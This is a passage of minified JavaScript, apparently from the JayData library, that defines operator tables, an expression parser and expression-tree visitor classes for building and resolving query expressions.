tyFunctionOperation:"EntityFunctionOperation",ContextFunctionOperation:"ContextFunctionOperation",EntityBinary:"EntityBinary",Code:"Code",ParametricQuery:"ParametricQuery",MemberInfo:"MemberInfo",QueryParameter:"QueryParameter",ComplexEntityField:"ComplexEntityField",Take:"Take",Skip:"Skip",OrderBy:"OrderBy",OrderByDescending:"OrderByDescending",Include:"Include",IndexedPhysicalAnd:"IndexedDBPhysicalAndFilterExpression",IndexedLogicalAnd:"IndexedDBLogicalAndFilterExpression",IndexedLogicalOr:"IndexedDBLogicalOrFilterExpression",IndexedLogicalIn:"IndexedDBLogicalInFilterExpression"});$data.BinaryOperator=function(){}
$data.binaryOperators=[{operator:"==",expressionType:$data.Expressions.ExpressionType.Equal,type:"boolean",implementation:function(a,b){return a==b;}},{operator:"===",expressionType:$data.Expressions.ExpressionType.EqualTyped,type:"boolean",implementation:function(a,b){return a===b;}},{operator:"!=",expressionType:$data.Expressions.ExpressionType.NotEqual,type:"boolean",implementation:function(a,b){return a!=b;}},{operator:"!==",expressionType:$data.Expressions.ExpressionType.NotEqualTyped,type:"boolean",implementation:function(a,b){return a!==b;}},{operator:">",expressionType:$data.Expressions.ExpressionType.GreaterThen,type:"boolean",implementation:function(a,b){return a>b;}},{operator:">=",expressionType:$data.Expressions.ExpressionType.GreaterThenOrEqual,type:"boolean",implementation:function(a,b){return a>=b;}},{operator:"<=",expressionType:$data.Expressions.ExpressionType.LessThenOrEqual,type:"boolean",implementation:function(a,b){return a<=b;}},{operator:"<",expressionType:$data.Expressions.ExpressionType.LessThen,type:"boolean",implementation:function(a,b){return a<b;}},{operator:"&&",expressionType:$data.Expressions.ExpressionType.And,type:"boolean",implementation:function(a,b){return a&&b;}},{operator:"||",expressionType:$data.Expressions.ExpressionType.Or,type:"boolean",implementation:function(a,b){return a||b;}},{operator:"&",expressionType:$data.Expressions.ExpressionType.AndBitwise,type:"number",implementation:function(a,b){return a&b;}},{operator:"|",expressionType:$data.Expressions.ExpressionType.OrBitwise,type:"number",implementation:function(a,b){return a|b;}},{operator:"+",expressionType:$data.Expressions.ExpressionType.Add,type:"number",implementation:function(a,b){return a+b;}},{operator:"-",expressionType:$data.Expressions.ExpressionType.Subtract,type:"number",implementation:function(a,b){return a-b;}},{operator:"/",expressionType:$data.Expressions.ExpressionType.Divide,type:"number",implementation:function(a,b){return a/b;}},{operator:"%",expressionType:$data.Expressions.ExpressionType.Modulo,type:"number",implementation:function(a,b){return a%b;}},{operator:"*",expressionType:$data.Expressions.ExpressionType.Multiply,type:"number",implementation:function(a,b){return a*b;}},{operator:"[",expressionType:$data.Expressions.ExpressionType.ArrayIndex,type:"number",implementation:function(a,b){return a[b];}},{operator:"in",expressionType:$data.Expressions.ExpressionType.In,type:'boolean',implementation:function(a,b){return a in b;}}];$data.binaryOperators.resolve=function(operator){var result=$data.binaryOperators.filter(function(item){return item.operator==operator;});if(result.length>0)
return operator;};$data.binaryOperators.contains=function(operator){return $data.binaryOperators.some(function(item){return item.operator==operator;});};$data.binaryOperators.getOperator=function(operator){var result=$data.binaryOperators.filter(function(item){return item.operator==operator;});if(result.length<1)
Guard.raise("Unknown operator: "+operator);return result[0];};$data.unaryOperators=[{operator:"+",arity:"prefix",expressionType:$data.Expressions.ExpressionType.Positive,type:"number",implementation:function(operand){return+operand;}},{operator:"-",arity:"prefix",expressionType:$data.Expressions.ExpressionType.Negative,type:"number",implementation:function(operand){return-operand;}},{operator:"++",arity:"prefix",expressionType:$data.Expressions.ExpressionType.Increment,type:"number",implementation:function(operand){return++operand;}},{operator:"--",arity:"prefix",expressionType:$data.Expressions.ExpressionType.Decrement,type:"number",implementation:function(operand){return--operand;}},{operator:"++",arity:"suffix",expressionType:$data.Expressions.ExpressionType.Increment,type:"number",implementation:function(operand){return operand++;}},{operator:"!",arity:"prefix",expressionType:$data.Expressions.ExpressionType.Not,type:"boolean",implementation:function(operand){return!operand;}},{operator:"--",arity:"suffix",expressionType:$data.Expressions.ExpressionType.Decrement,type:"number",implementation:function(operand){return operand--;}}];$data.unaryOperators.resolve=function(operator){var result=$data.unaryOperators.filter(function(item){return item.operator==operator;});if(result.length>0)
return operator;};$data.unaryOperators.contains=function(operator){return $data.unaryOperators.some(function(item){return item.operator==operator;});};$data.unaryOperators.getOperator=function(operator,arity){var result=$data.unaryOperators.filter(function(item){return item.operator==operator&&(!arity||item.arity==arity);});if(result.length<1)
Guard.raise("Unknown operator: "+operator);return result[0];};$data.timeIt=function(fn,iterations){iterations=iterations||1;console.time("!");for(var i=0;i<iterations;i++){fn();}
console.timeEnd("!");}
$data.Expressions.OperatorTypes={UNARY:"UNARY",INCDEC:"INCDEC",DECISION:"DECISION",METHODCALL:"METHODCALL",NEW:"NEW",JSONASSIGN:"JSONASSIGN",ARRAYACCESS:"ARRAYACCESS",UNKNOWN:"UNKNOWN"};$data.executable=true;function jsonify(obj){return JSON.stringify(obj,null,"\t");}
$C('$data.Expressions.ExpressionNode',null,null,{constructor:function(){this.expressionType=this.constructor;},getJSON:function(){return jsonify(this);},expressionType:{set:function(value){if(typeof value==='string'){value=Container.resolveType(value);}
this._expressionType=value;},get:function(value){if(arguments.callee.caller==jsonify||arguments.callee.caller==JSON.stringify){return Container.resolveName(this._expressionType);}
return this._expressionType;},enumerable:true},nodeType:{value:$data.Expressions.ExpressionType.Unknown,writable:false},type:{},isTerminated:{value:false},toString:function(){return this.value;}},null);$C('$data.Expressions.UnaryExpression',$data.Expressions.ExpressionNode,null,{constructor:function(operand,operator,nodeType,resolution){this.operand=operand;this.operator=operator;this.nodeType=nodeType;this.resolution=resolution;},operator:{value:undefined,writable:true},operand:{value:undefined,writable:true},nodeType:{value:undefined,writable:true}});$C('$data.Expressions.ArrayLiteralExpression',$data.Expressions.ExpressionNode,null,{constructor:function(items){this.items=items||[];},nodeType:{value:$data.Expressions.ExpressionType.ArrayLiteral,writable:true},items:{value:undefined,dataType:Array,elementType:$data.Expressions.ExpressionNode},toString:function(debug){var result="["+this.items.map(function(item){return item.toString();}).join(",")+"]";return result;}},null);$C('$data.Expressions.CallExpression',$data.Expressions.ExpressionNode,null,{constructor:function(expression,member,args){this.expression=expression;this.member=member;this.args=args;},nodeType:{value:$data.Expressions.ExpressionType.Call},expression:{value:undefined,dataType:$data.Expressions.ExpressionNode,writable:true},member:{value:undefined,dataType:$data.MemberDefinition,writable:true},type:{value:undefined,writable:true},implementation:{get:function(){return function(thisObj,method,args){if(typeof method!=='function'){method=thisObj[method];}
Guard.requireType("method",method,Function);return method.apply(thisObj,args);};},set:function(value){Guard.raise("Property can not be set");}},toString:function(debug){return this.object.toString()+"."+this.member.toString()+"("+")";}});$C('$data.Expressions.CodeParser',null,null,{constructor:function(scopeContext){this.scopeContext=scopeContext;this.lambdaParams=[];},log:function(logInfo){if(this.scopeContext)
this.scopeContext.log(logInfo);},parseExpression:function(code,resolver){if(typeof code==='object'){code='';}
var result={success:true,errorMessage:'',errorDetails:''};var AST=$data.ASTParser.parseCode(code);this.log({event:"AST",data:AST});if(!AST.success){return{success:false,error:"ASTParser error",errorMessage:(AST.errors)?JSON.stringify(AST.errors):"could not get code"};}
var b=this.Build2(AST.tree.first[0]);result={success:true,expression:b,errors:AST.errors};return result;},createExpression:function(code,resolver){var result=this.parseExpression(code,resolver);if(!result.success){Guard.raise("ExpressionParserError: "+result.errorMessage);}
return result.expression;},Build2:function(node){var n;switch(node.arity){case"number":case"string":n=this.BuildConstant(node);break;case"prefix":switch(node.value){case"{":n=this.BuildObjectLiteral(node);break;case"[":n=this.BuildArrayLiteral(node);break;case $data.unaryOperators.resolve(node.value):n=this.BuildUnary(node);break;}
break;case"suffix":switch(node.value){case $data.unaryOperators.resolve(node.value):n=this.BuildUnary(node);break;default:Guard.raise("Unknown suffix: "+node.value);}
break;case"infix":switch(node.value){case"[":n=this.BuildArray(node);break;case $data.binaryOperators.resolve(node.value):n=this.BuildSimpleBinary(node);break;case"function":Guard.raise("Unexpected function arity");case"(":n=this.BuildCall(node);break;case".":n=this.BuildProperty(node);break;default:debugger;}
break;case"statement":switch(node.value){case"function":n=this.BuildFunction(node);}
break;default:switch(node.value){case"function":n=this.BuildFunction(node);break;case"true":case"false":case"null":n=this.BuildConstant(node);break;case"this":n=this.BuildThis(node);break;default:n=this.BuildParameter(node);break;}}
return n;},BuildThis:function(node){var result=Container.createThisExpression();return result;},BuildConstant:function(node){var value=node.value;var type=node.type;if(node.reserved===true){switch(node.value){case"true":value=true;type=typeof true;break;case"false":value=false;type=typeof false;break;case"null":value=null;type=typeof null;break;}}
var result=new $data.Expressions.ConstantExpression(value,type);return result;},BuildFunctionParameter:function(node){},BuildArray:function(node){switch(node.second.type){case"string":return this.BuildProperty(node);case"number":default:return this.BuildSimpleBinary(node);}},BuildParameter:function(node){var paramName=node.value;var nodeType=node.funct?$data.Expressions.ExpressionType.LambdaParameter:this.lambdaParams.indexOf(node.value)>-1?$data.Expressions.ExpressionType.LambdaParameterReference:$data.Expressions.ExpressionType.Parameter;var result=new $data.Expressions.ParameterExpression(node.value,null,nodeType);if(nodeType==$data.Expressions.ExpressionType.LambdaParameterReference){result.paramIndex=this.lambdaParams.indexOf(node.value);}
return result;},BuildArrayLiteral:function(node){var self=this;var items=node.first.map(function(item){return self.Build2(item);});var result=new $data.Expressions.ArrayLiteralExpression(items);return result;},BuildObjectLiteral:function(node){var self=this;var fields=node.first.map(function(item){var eItem=self.Build2(item.first);var result=new $data.Expressions.ObjectFieldExpression(item.value,eItem);return result;});var result=new $data.Expressions.ObjectLiteralExpression(fields);return result;},BuildFunction:function(node){var self=this;var paramStack=[];var params=node.first&&node.first.map(function(paramNode){this.lambdaParams.push(paramNode.value);return self.BuildParameter(paramNode);},this);params=params||[];var hasReturn=node.block.length==0?false:node.block[0].value==="return"?true:false;var body=(node.block.length>0)?this.Build2(hasReturn?node.block[0].first:node.block[0]):null;paramStack.forEach(function(){this.lambdaParams.pop();},this);var result=new $data.Expressions.FunctionExpression(node.value,params,body);params.forEach(function(param){param.owningFunction=result;});result.name=node.name;return result;},BuildCall:function(node){var self=this;var method=self.Build2(node.first);var args=node.second.map(function(exp){return self.Build2(exp);});var member;var expression;switch(true){case method instanceof $data.Expressions.PropertyExpression:expression=method.expression;member=method.member;break;case method instanceof $data.Expressions.ParameterExpression:expression=Container.createConstantExpression(null,typeof null);member=method;break;}
var result=Container.createCallExpression(expression,member,args);return result;},BuildProperty:function(node){var expression=this.Build2(node.first);var member;if(node.second.identifier){member=new $data.Expressions.ConstantExpression(node.second.value,"string");}else{member=this.Build2(node.second);}
var result=new $data.Expressions.PropertyExpression(expression,member);return result;},BuildUnary:function(node){var operator=$data.unaryOperators.getOperator(node.value,node.arity);var nodeType=operator.expressionType;var operand=this.Build2(node.first);var result=new $data.Expressions.UnaryExpression(operand,operator,nodeType);return result;},BuildSimpleBinary:function(node){var operator=$data.binaryOperators.getOperator(node.value);var nodeType=operator.expressionType;var left=this.Build2(node.first||node.left);var right=this.Build2(node.second||node.right);var result=new $data.Expressions.SimpleBinaryExpression(left,right,nodeType,node.value,operator.type);return result;}});$C('$data.Expressions.ConstantExpression',$data.Expressions.ExpressionNode,null,{constructor:function(value,type,name){this.value=value;this.type=Container.getTypeName(value);this.name=name;},nodeType:{value:$data.Expressions.ExpressionType.Constant,enumerable:true},type:{value:Object,writable:true},value:{value:undefined,writable:true},toString:function(debug){return this.value.toString();}});$C('$data.Expressions.FunctionExpression',$data.Expressions.ExpressionNode,null,{constructor:function(name,parameters,body){this.parameters=parameters||[];this.name=name;this.body=body;},toString:function(debug){var paramStrings=this.parameters.map(function(p){return p.toString();});paramStrings=paramStrings.join(",");var bodyString=(this.body?this.body.toString(debug):'');return"function "+this.name+"("+paramStrings+") { "+bodyString+"}";},nodeType:{value:$data.Expressions.ExpressionType.Function,writable:true},parameters:{value:undefined,dataType:Array,elementType:$data.Expressions.ParameterExpression},body:{value:undefined,dataType:$data.Expressions.ExpressionNode},type:{}},null);$C('$data.Expressions.ObjectFieldExpression',$data.Expressions.ExpressionNode,null,{constructor:function(fieldName,expression){this.fieldName=fieldName;this.expression=expression;},nodeType:{value:$data.Expressions.ExpressionType.ObjectField,writable:true},toString:function(debug){var result="unimplemented";return result;}},null);$C('$data.Expressions.ObjectLiteralExpression',$data.Expressions.ExpressionNode,null,{constructor:function(members){this.members=members;},nodeType:{value:$data.Expressions.ExpressionType.ObjectLiteral,writable:true},toString:function(debug){var result="unimplemented";return result;},implementation:{get:function(){return function(namesAndValues){var result={};namesAndValues.forEach(function(item){result[item.name]=item.value;});return result;};},set:function(){}}},null);$C('$data.Expressions.PagingExpression',$data.Expressions.ExpressionNode,null,{constructor:function(source,expression,nType){this.source=source;this.amount=expression;this.nodeType=nType;},nodeType:{value:$data.Expressions.ExpressionType.Unknown,writable:true},toString:function(debug){var result="unimplemented";return result;}},null);$C('$data.Expressions.ParameterExpression',$data.Expressions.ExpressionNode,null,{constructor:function(name,type,nodeType){this.nodeType=nodeType||$data.Expressions.ExpressionType.Parameter;this.name=name;this.type=type||"unknown";var _owningFunction;},owningFunction:{value:undefined,enumerable:false},nodeType:{value:$data.Expressions.ExpressionType.Parameter,writable:true},name:{value:undefined,dataType:String,writable:true},type:{value:undefined,dataType:"object",writable:true},toString:function(debug){var result;result=debug?this.type+" ":"";result=result+this.name;return result;}},null);$C('$data.Expressions.PropertyExpression',$data.Expressions.ExpressionNode,null,{constructor:function(expression,member){this.expression=expression;this.member=member;this.type=member.dataType;},nodeType:{value:$data.Expressions.ExpressionType.MemberAccess},expression:{value:undefined,dataType:$data.Expressions.ExpressionNode,writable:true},implementation:{get:function(){return function(holder,memberName){if(holder[memberName]===undefined)
Guard.raise(new Exception("Parameter '"+memberName+"' not found in context",'Property not found!'));return holder[memberName];};},set:function(){}},member:{value:undefined,dataType:$data.MemberDefinition,writable:true},type:{value:undefined,writable:true},toString:function(debug){return this.expression.toString()+"."+this.member.toString();}});$C('$data.Expressions.SimpleBinaryExpression',$data.Expressions.ExpressionNode,null,{constructor:function(left,right,nodeType,operator,type,resolution){this.left=left;this.right=right;this.nodeType=nodeType;this.operator=operator;this.type=type;this.resolution=resolution;},implementation:{get:function(){return $data.binaryOperators.getOperator(this.operator).implementation;},set:function(){}},type:{value:"number",writable:true}});$C('$data.Expressions.ThisExpression',$data.Expressions.ExpressionNode,null,{nodeType:{value:$data.Expressions.ExpressionType.This}});$C('$data.Expressions.ExpressionVisitor',null,null,{constructor:function(){this._deep=0;},Visit:function(eNode,context){if(!eNode){return eNode;}
var result=null;switch(eNode.expressionType){case $data.Expressions.ParameterExpression:result=this.VisitParameter(eNode,context);break;case $data.Expressions.ConstantExpression:result=this.VisitConstant(eNode,context);break;case $data.Expressions.FunctionExpression:result=this.VisitFunction(eNode,context);break;case $data.Expressions.CallExpression:result=this.VisitCall(eNode,context);break;case $data.Expressions.SimpleBinaryExpression:result=this.VisitBinary(eNode,context);break;case $data.Expressions.PropertyExpression:result=this.VisitProperty(eNode,context);break;case $data.Expressions.ThisExpression:result=this.VisitThis(eNode,context);break;case $data.Expressions.ObjectLiteralExpression:result=this.VisitObjectLiteral(eNode,context);break;case $data.Expressions.ObjectFieldExpression:result=this.VisitObjectField(eNode,context);break;case $data.Expressions.ArrayLiteralExpression:result=this.VisitArrayLiteral(eNode,context);break;case $data.Expressions.UnaryExpression:result=this.VisitUnary(eNode,context);break;case $data.Expressions.EntityContextExpression:result=this.VisitEntityContext(eNode,context);break;default:debugger;break;}
this._deep=this._deep-1;return result;},VisitArrayLiteral:function(eNode,context){var self=this;var items=eNode.items.map(function(item){return self.Visit(item,context);});var result=Container.createArrayLiteralExpression(items);return result;},VisitObjectLiteral:function(eNode,context){var self=this;var members=eNode.members.map(function(member){return self.Visit(member,context);});var result=Container.createObjectLiteralExpression(members);return result;},VisitObjectField:function(eNode,context){var expression=this.Visit(eNode.expression,context);var result=Container.createObjectFieldExpression(eNode.fieldName,expression);return result;},VisitThis:function(eNode,context){return eNode;},VisitCall:function(eNode,context){var self=this;var args=eNode.args.map(function(arg){return this.Visit(arg,context);},this);var expression=this.Visit(eNode.expression,context);var member=this.Visit(eNode.member,context);return new $data.Expressions.CallExpression(expression,member,args);},VisitParameter:function(eNode,context){return eNode;},VisitConstant:function(eNode,context){return eNode;},VisitFunction:function(eNode,context){var self=this;var params=eNode.parameters.map(function(p,i){return self.Visit(p,context);});var body=self.Visit(eNode.body,context);var result=new $data.Expressions.FunctionExpression(eNode.name,params,body);return result;},VisitBinary:function(eNode,context){var left=this.Visit(eNode.left,context);var right=this.Visit(eNode.right,context);return new $data.Expressions.SimpleBinaryExpression(left,right,eNode.nodeType,eNode.operator,eNode.type);},VisitProperty:function(eNode,context){var expression=this.Visit(eNode.expression,context);var member=this.Visit(eNode.member,context);return new $data.Expressions.PropertyExpression(expression,member);},VisitUnary:function(eNode,context){var operand=this.Visit(eNode.operand,context);if(operand===eNode.operand)
return eNode;return new $data.Expressions.UnaryExpression(operand,eNode.operator,eNode.nodeType);},VisitEntityContext:function(eNode,context){return eNode;},VisitDecision:function(eNode,context){var expression=this.Visit(eNode.expression,context);var left=this.Visit(eNode.left,context);var right=this.Visit(eNode.right,context);if(expression===eNode.expression&&left===eNode.left&&right===eNode.right)
return eNode;return $data.Expressions.ExpressionNodeTypes.DecisionExpressionNode.create(eNode.executable,expression,left,right);},VisitNew:function(eNode,context){var values=this.VisitArray(eNode.values,context);if(values===eNode.values)
return eNode;return $data.Expressions.ExpressionNodeTypes.NewExpressionNode.create(true,values);},VisitArrayAccess:function(eNode,context){var array=this.Visit(eNode.array,context);var index=this.Visit(eNode.index,context);if(array===eNode.array&&index===eNode.index)
return eNode;return $data.Expressions.ExpressionNodeTypes.ArrayAccessExpressionNode.create(true,array,index);},VisitArray:function(eNodes,context){var args=[];var ok=true;for(var i=0;i<eNodes.length;i++){args[i]=this.Visit(eNodes[i],context);ok=ok&&args[i]===eNodes[i];}
return ok?eNodes:args;},GetMemberChain:function(memberAccess,context){if(memberAccess.expression.type==MEMBERACCESS){var a=this.GetMemberChain(memberAccess.expression,context);a.push(memberAccess.member);return a;}
return[memberAccess.expression,memberAccess.member];}},{});$C("$data.Expressions.ParameterProcessor",$data.Expressions.ExpressionVisitor,null,{constructor:function(){},Visit:function(node,context){if((node instanceof $data.Expressions.ParameterExpression||node instanceof $data.Expressions.ThisExpression)&&this.canResolve(node)){var result=this.resolve(node,context);if(result!==node)
result["resolvedBy"]=this.constructor.name;return result;}else{return node;}},canResolve:function(paramExpression){Guard.raise("Pure method");},resolve:function(paramExpression){Guard.raise("Pure method");}});$C("$data.Expressions.GlobalContextProcessor",$data.Expressions.ParameterProcessor,null,{constructor:function(global){this.global=global;},canResolve:function(paramExpression){return paramExpression.nodeType==$data.Expressions.ExpressionType.Parameter&&this.global&&typeof this.global==='object'&&paramExpression.name in this.global;},resolve:function(paramExpression){var resultValue=this.global[paramExpression.name];var expression=Container.createConstantExpression(resultValue,typeof resultValue,paramExpression.name);return expression;}});$C("$data.Expressions.ConstantValueResolver",$data.Expressions.ParameterProcessor,null,{constructor:function(paramsObject,global,scopeContext){this.globalResolver=Container.createGlobalContextProcessor(global);this.paramResolver=Container.createGlobalContextProcessor(paramsObject);this.paramsObject=paramsObject;this.scopeContext=scopeContext;},canResolve:function(paramExpression){return(paramExpression.name==='$context')||(paramExpression.nodeType==$data.Expressions.ExpressionType.This&&this.paramsObject)?true:(this.paramResolver.canResolve(paramExpression)||this.globalResolver.canResolve(paramExpression));},resolve:function(paramExpression){if(paramExpression.name==='$context'){return Container.createEntityContextExpression(this.scopeContext);}
if(paramExpression.nodeType==$data.Expressions.ExpressionType.This){return Container.createConstantExpression(this.paramsObject,typeof this.paramsObject,'this');}
return this.paramResolver.canResolve(paramExpression)?this.paramResolver.resolve(paramExpression):this.globalResolver.resolve(paramExpression);}});$C("$data.Expressions.LocalContextProcessor",$data.Expressions.GlobalContextProcessor,null,{constructor:function(evalMethod){this.canResolve=function(paramExpression){return paramExpression.nodeType==$data.Expressions.ExpressionType.Parameter&&(evalMethod("typeof "+paramExpression.name)!=='undefined');};this.resolve=function(paramExpression){var resultValue=evalMethod(paramExpression.name);var expression=Container.createConstantExpression(resultValue,typeof resultValue);return expression;};}});$C("$data.Expressions.LambdaParameterProcessor",$data.Expressions.ParameterProcessor,null,{constructor:function(lambdaParameterTypeInfos){var paramIndices={};var $idx="name";this.canResolve=function(paramExpression,context){if(paramExpression.nodeType==$data.Expressions.ExpressionType.LambdaParameter){var fnParams=paramExpression.owningFunction.parameters;if(fnParams.length==1&&paramExpression.name==fnParams[0].name){paramIndices[paramExpression.name]=lambdaParameterTypeInfos[0];return true;}
for(var j=0;j<fnParams.length;j++){if(fnParams[j].name==paramExpression.name){paramIndices[paramExpression.name]=lambdaParameterTypeInfos[j];return true;}}
return false;}
return false;};this.resolve=function(paramExpression,context){var lambdaParamType=paramIndices[paramExpression.name];var result=Container.createParameterExpression(paramExpression.name,lambdaParamType,$data.Expressions.ExpressionType.LambdaParameter);result.owningFunction=paramExpression.owningFunction;return result;};}});$C('$data.Expressions.ParameterResolverVisitor',$data.Expressions.ExpressionVisitor,null,{constructor:function(expression,resolver){this.lambdaParamCache={};},Visit:function(expression,resolver){return $data.Expressions.ExpressionVisitor.prototype.Visit.call(this,expression,resolver);},VisitArrayLiteral:function(eNode,context){var self=this;var items=eNode.items.map(function(item){return self.Visit(item,context);});var allLocal=items.every(function(item){return item instanceof $data.Expressions.ConstantExpression;});if(allLocal){items=items.map(function(item){return item.value});return Container.createConstantExpression(items,"array");}else{return Container.createArrayLiteralExpression(items);}},VisitObjectLiteral:function(eNode,context){var self=this;var members=eNode.members.map(function(item){return self.Visit(item,context);});var allLocal=members.every(function(member){return member.expression instanceof $data.Expressions.ConstantExpression;});if(allLocal){var params=members.map(function(member){return{name:member.fieldName,value:member.expression.value};});return Container.createConstantExpression(eNode.implementation(params));}else{return Container.createObjectLiteralExpression(members);}},VisitThis:function(eNode,resolver){return resolver.Visit(eNode,resolver);},VisitParameter:function(eNode,resolver){var node;switch(eNode.nodeType){case $data.Expressions.ExpressionType.Parameter:case $data.Expressions.ExpressionType.LambdaParameter:node=resolver.Visit(eNode,resolver);if(node.nodeType==$data.Expressions.ExpressionType.LambdaParameter){this.lambdaParamCache[node.name]=node;}
return node;case $data.Expressions.ExpressionType.LambdaParameterReference:var lambdaParam=this.lambdaParamCache[eNode.name];if(lambdaParam){node=Container.createParameterExpression(eNode.name,lambdaParam.type,$data.Expressions.ExpressionType.LambdaParameterReference);node.paramIndex=eNode.paramIndex;return node;}
break;default:return eNode;}
return eNode;},VisitConstant:function(eNode,context){return eNode;},VisitFunction:function(eNode,context){var self=this;var params=eNode.parameters.map(function(p,i){var result=self.Visit(p,context);return result;});var body=self.Visit(eNode.body,context);var result=new $data.Expressions.FunctionExpression(eNode.name,params,body);return result;},VisitBinary:function(eNode,context){var left=this.Visit(eNode.left,context);var right=this.Visit(eNode.right,context);var expr=$data.Expressions;if(left instanceof expr.ConstantExpression&&right instanceof expr.ConstantExpression)
{var result=eNode.implementation(left.value,right.value);return Container.createConstantExpression(result);}
return new Container.createSimpleBinaryExpression(left,right,eNode.nodeType,eNode.operator,eNode.type);},VisitUnary:function(eNode,context){var operand=this.Visit(eNode.operand,context);var expr=$data.Expressions;if(operand instanceof expr.ConstantExpression)
{var result=eNode.operator.implementation(operand.value);return Container.createConstantExpression(result);}
return new Container.createUnaryExpression(operand,eNode.operator,eNode.nodeType);},VisitProperty:function(eNode,context){var expression=this.Visit(eNode.expression,context);var member=this.Visit(eNode.member,context);var result;if(expression instanceof $data.Expressions.ConstantExpression&&member instanceof $data.Expressions.ConstantExpression){result=eNode.implementation(expression.value,member.value);return Container.createConstantExpression(result,typeof result,expression.name+'$'+member.value);}
if(expression===eNode.expression&&member===eNode.member)
return eNode;result=Container.createPropertyExpression(expression,member);return result;},VisitCall:function(eNode,context){function isExecutable(args,body,obj){return body instanceof $data.Expressions.ConstantExpression&&(!obj||obj instanceof $data.Expressions.ConstantExpression)&&args.every(function(item){return item instanceof $data.Expressions.ConstantExpression;});}
var call=$data.Expressions.ExpressionVisitor.prototype.VisitCall.apply(this,arguments);var obj=call.expression;var body=call.member;var args=call.args;function convertToValue(arg){if(arg instanceof $data.Expressions.ConstantExpression)
return arg.value;return arg;};if(isExecutable(args,body,obj)){var fn=body.value;if(typeof fn==='string'&&obj.value){fn=obj.value[fn];}
if(typeof fn!=='function'){Guard.raise("Constant expression is not a method...");}
var value=eNode.implementation(obj.value,fn,args.map(convertToValue));return new $data.Expressions.ConstantExpression(value);}
return call;}},{});$C("$data.Expressions.AggregatedVisitor",$data.Expressions.ExpressionVisitor,null,{constructor:function(visitors){this.Visit=function(node,context){for(var i=0;i<visitors.length;i++){var n=visitors[i].Visit(node,context);if(n!==node)
return n;}
return node;};}});$C('$data.Expressions.LogicalSchemaBinderVisitor',$data.Expressions.ExpressionVisitor,null,{constructor:function(expression,binder){},VisitProperty:function(expression,context){var exp=this.Visit(expression.expression,context);var mem=this.Visit(expression.member,context);var type=exp.type;var memberType=context.memberResolver.resolve(type,mem.value);mem.type=memberType;return Container.createPropertyExpression(exp,mem);}},{});$data.Class.define('$data.Expressions.ExpTreeVisitor',null,null,{constructor:function(){this._deep=0;},Visit:function(eNode,context){this._deep=this._deep+1;var result=null;switch(eNode.type){case LITERAL:result=this.VisitLiteral(eNode,context);break;case VARIABLE:result=this.VisitVariable(eNode,context);break;case MEMBERACCESS:result=this.VisitMember(eNode,context);break;case BINARY:result=this.VisitBinary(eNode,context);break;case UNARY:result=this.VisitUnary(eNode,context);break;case INCDEC:result=this.VisitIncDec(eNode,context);break;case EQUALITY:result=this.VisitEquality(eNode,context);break;case DECISION:result=this.VisitDecision(eNode,context);break;case METHODCALL:result=this.VisitMethodCall(eNode,context);break;case NEW:result=this.VisitNew(eNode,context);break;case JSONASSIGN:result=this.VisitJsonAssign(eNode,context);break;case ARRAYACCESS:result=this.VisitArrayAccess(eNode,context);break;default:Guard.raise("Type isn't implemented: "+eNode.type);}
this._deep=this._deep-1;return result;},VisitLiteral:function(eNode,context){return eNode;},VisitVariable:function(eNode,context){return eNode;},VisitMember:function(eNode,context){var expression=this.Visit(eNode.expression,context);var member=this.Visit(eNode.member,context);if(expression===eNode.expression&&member===eNode.member)
return eNode;return $data.Expressions.ExpressionNodeTypes.MemberAccessExpressionNode.create(eNode.executable,expression,member);},VisitBinary:function(eNode,context){var left=this.Visit(eNode.left,context);var right=this.Visit(eNode.right,context);if(left===eNode.left&&right===eNode.right)
return eNode;return $data.Expressions.ExpressionNodeTypes.BinaryExpressionNode.create(eNode.executable,eNode.operator,left,right);},VisitUnary:function(eNode,context){var operand=this.Visit(eNode.operand,context);if(operand===eNode.operand)
return eNode;return $data.Expressions.ExpressionNodeTypes.UnaryExpressionNode.create(eNode.executable,eNode.operator,operand);},VisitIncDec:function(eNode,context){var operand=this.Visit(eNode.operand,context);if(operand===eNode.operand)
return eNode;return $data.Expressions.ExpressionNodeTypes.IncDecExpressionNode.create(eNode.executable,eNode.operator,operand,eNode.suffix);},VisitEquality:function(eNode,context){var left=this.Visit(eNode.left,context);var right=this.Visit(eNode.right,context);if(left===eNode.left&&right===eNode.right)
return eNode;return $data.Expressions.ExpressionNodeTypes.EqualityExpressionNode.create(eNode.executable,eNode.operator,left,right);},VisitDecision:function(eNode,context){var expression=this.Visit(eNode.expression,context);var left=this.Visit(eNode.left,context);var right=this.Visit(eNode.right,context);if(expression===eNode.expression&&left===eNode.left&&right===eNode.right)
return eNode;return $data.Expressions.ExpressionNodeTypes.DecisionExpressionNode.create(eNode.executable,expression,left,right);},VisitMethodCall:function(eNode,context){var object=eNode.object?this.Visit(eNode.object,context):null;var args=this.VisitArray(eNode.args,context);if(object===eNode.object&&args===eNode.args)
return eNode;return $data.Expressions.ExpressionNodeTypes.MethodcallExpressionNode.create(eNode.executable,object,eNode.method,args);},VisitNew:function(eNode,context){var values=this.VisitArray(eNode.values,context);if(values===eNode.values)
return eNode;return $data.Expressions.ExpressionNodeTypes.NewExpressionNode.create(true,values);},VisitJsonAssign:function(eNode,context){var left=this.Visit(eNode.left,context);var right=this.Visit(eNode.right,context);if(left===eNode.left&&right===eNode.right)
return eNode;left.JSONASSIGN=true;right.JSONASSIGN=true;return $data.Expressions.ExpressionNodeTypes.JsonAssignExpressionNode.create(true,left,right);},VisitArrayAccess:function(eNode,context){var array=this.Visit(eNode.array,context);var index=this.Visit(eNode.index,context);if(array===eNode.array&&index===eNode.index)
return eNode;return $data.Expressions.ExpressionNodeTypes.ArrayAccessExpressionNode.create(true,array,index);},VisitArray:function(eNodes,context){var args=[];var ok=true;for(var i=0;i<eNodes.length;i++){args[i]=this.Visit(eNodes[i],context);ok=ok&&args[i]===eNodes[i];}
return ok?eNodes:args;},GetMemberChain:function(memberAccess,context){if(memberAccess.expression.type==MEMBERACCESS){var a=this.GetMemberChain(memberAccess.expression,context);a.push(memberAccess.member);return a;}
